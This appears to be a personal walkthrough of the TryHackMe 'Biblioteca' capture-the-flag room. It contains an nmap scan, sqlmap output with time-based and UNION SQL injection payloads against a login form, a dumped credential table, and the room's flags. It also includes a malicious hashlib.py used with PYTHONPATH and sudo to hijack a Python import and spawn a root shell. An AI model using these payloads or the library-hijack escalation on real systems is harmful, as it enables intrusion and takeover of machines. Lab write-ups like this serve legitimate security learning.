nmap
```
┌──(gomez22㉿DESKTOP-V2K8SJ4)-[~]
└─$ sudo nmap -sS -Pn -sV 10.10.229.254
[sudo] password for gomez22: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-14 16:03 PDT
Nmap scan report for 10.10.229.254
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.02 seconds

```

sqlmap
```
[16:16:10] [INFO] parsing HTTP request from 'packet.txt'
[16:16:10] [INFO] testing connection to the target URL
[16:16:11] [INFO] checking if the target is protected by some kind of WAF/IPS
[16:16:11] [INFO] testing if the target URL content is stable
[16:16:11] [INFO] target URL content is stable
[16:16:11] [INFO] testing if POST parameter 'username' is dynamic
[16:16:11] [WARNING] POST parameter 'username' does not appear to be dynamic
[16:16:11] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[16:16:12] [INFO] testing for SQL injection on POST parameter 'username'
[16:16:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[16:16:14] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[16:16:14] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[16:16:15] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[16:16:17] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[16:16:18] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[16:16:19] [INFO] testing 'Generic inline queries'
[16:16:20] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[16:16:20] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[16:16:21] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[16:16:22] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[16:16:33] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] n
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[16:16:48] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[16:16:48] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[16:16:48] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[16:16:49] [INFO] target URL appears to have 4 columns in query
[16:16:50] [INFO] POST parameter 'username' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
[16:17:00] [INFO] testing if POST parameter 'password' is dynamic
[16:17:00] [WARNING] POST parameter 'password' does not appear to be dynamic
[16:17:01] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be injectable
[16:17:01] [INFO] testing for SQL injection on POST parameter 'password'
[16:17:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[16:17:03] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[16:17:04] [INFO] testing 'Generic inline queries'
[16:17:04] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[16:17:05] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[16:17:16] [INFO] POST parameter 'password' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[16:17:16] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[16:17:20] [INFO] target URL appears to be UNION injectable with 4 columns
[16:17:21] [INFO] POST parameter 'password' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 107 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test' AND (SELECT 4612 FROM (SELECT(SLEEP(5)))FrWz) AND 'TOpF'='TOpF&password=test

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: username=test' UNION ALL SELECT NULL,CONCAT(0x7178627171,0x6a5a425059484e55536a57466e41717078614a79484b437369704857627a714963786d7266506b46,0x7176717071),NULL,NULL-- -&password=test

Parameter: password (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test&password=test' AND (SELECT 2955 FROM (SELECT(SLEEP(5)))zezF) AND 'FLeX'='FLeX

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: username=test&password=test' UNION ALL SELECT NULL,CONCAT(0x7178627171,0x675276677647776e5a414f4f71794951587571786b544f626b62436e4a617447526a50554844436f,0x7176717071),NULL,NULL-- -
---
[16:18:21] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12

```


```
┌──(gomez22㉿DESKTOP-V2K8SJ4)-[~/biblioteca]
└─$ sqlmap -r packet.txt --dbms=MySql --dump

...
+----+-------------------+----------------+----------+
| id | email             | password       | username |
+----+-------------------+----------------+----------+
| 1  | smokey@email.boop | My_P@ssW0rd123 | smokey   |
+----+-------------------+----------------+----------+

```

The creds `smokey:My_P@ssW0rd123` allowed me to both login on the website (dead-end) and ssh in.

We have a foothold!
```
smokey@biblioteca:~$ sudo -l
[sudo] password for smokey: 
Sorry, user smokey may not run sudo on biblioteca.

...

smokey@biblioteca:/home$ ls
hazel  smokey
smokey@biblioteca:/home$ cd hazel
smokey@biblioteca:/home/hazel$ ls
hasher.py  user.txt
smokey@biblioteca:/home/hazel$ cat user.txt
cat: user.txt: Permission denied
smokey@biblioteca:/home/hazel$ ls -la
total 32
drwxr-xr-x 3 root  root  4096 Mar  2 03:01 .
drwxr-xr-x 4 root  root  4096 Dec  7  2021 ..
lrwxrwxrwx 1 root  root     9 Dec  7  2021 .bash_history -> /dev/null
-rw-r--r-- 1 hazel hazel  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 hazel hazel 3771 Feb 25  2020 .bashrc
drwx------ 2 hazel hazel 4096 Dec  7  2021 .cache
-rw-r----- 1 root  hazel  497 Dec  7  2021 hasher.py
-rw-r--r-- 1 hazel hazel  807 Feb 25  2020 .profile
-rw-r----- 1 root  hazel   45 Mar  2 03:01 user.txt
-rw------- 1 hazel hazel    0 Dec  7  2021 .viminfo

```
So we have a new user: `hazel`. I'm giving hydra a try to see if I can find their password. After a long
search with hydra I found the credentials to be `hazel:hazel`.

```
smokey@biblioteca:/home/hazel$ su hazel
Password: 
hazel@biblioteca:~$ ls
hasher.py  user.txt
hazel@biblioteca:~$ cat user.txt
THM{G0Od_OLd_SQL_1nj3ct10n_&_w3@k_p@sSw0rd$}
```

```
hazel@biblioteca:~$ sudo -l
Matching Defaults entries for hazel on biblioteca:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hazel may run the following commands on biblioteca:
    (root) SETENV: NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py

```

At this point, I got stuck. My only lead was `hasher.py`
```
import hashlib

def hashing(passw):

    md5 = hashlib.md5(passw.encode())

    print("Your MD5 hash is: ", end ="")
    print(md5.hexdigest())

    sha256 = hashlib.sha256(passw.encode())

    print("Your SHA256 hash is: ", end ="")
    print(sha256.hexdigest())

    sha1 = hashlib.sha1(passw.encode())

    print("Your SHA1 hash is: ", end ="")
    print(sha1.hexdigest())


def main():
    passw = input("Enter a password to hash: ")
    hashing(passw)

if __name__ == "__main__":
    main()


```
I had a feeling that I needed to do some sort of path injection/file injection to privesc but I didn't know what. I consulted a walkthrough
and found that I was on the right path. I followed this guide: https://infosecwriteups.com/tryhackme-biblioteca-c56be949564c by `Naman Jain`. They walkthrough
how you can create a new `hashlib.py` file in the `/tmp` directory, write your exploit to it, and then set the `PYTHONPATH` env
variable to get your hashlib.py code executed over the real code. My approach from differed from Naman's in that I chose to spawn
a new root shell and they chose to have the python script send a root reverse shell to them. 

my hashlib.py
```
# cat hashlib.py
import os

os.setuid(0)
os.system("/bin/sh")
```

```
hazel@biblioteca:/tmp$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/hazel/has
# whoami
root
# cat /root/root.txt
THM{PytH0n_LiBr@RY_H1j@acKIn6}

```
